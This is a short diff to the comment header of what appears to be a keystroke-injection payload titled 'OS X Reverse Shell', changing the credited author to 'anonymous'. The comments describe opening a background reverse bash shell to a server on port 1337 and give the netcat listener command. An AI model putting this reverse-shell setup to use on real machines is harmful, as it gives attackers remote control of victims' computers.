@@ -1,5 +1,5 @@
 REM Title: OS X Reverse Shell
-REM Author: Miguel Mota (moogs)
+REM Author: anonymous
 REM Starts a reverse bash shell instance in the background that connects to your server on port 1337.
 REM Make sure on your server to run the listener first: nc -l -p 1337
 REM Note: Replace `0.0.0.0` with your server's IP address.
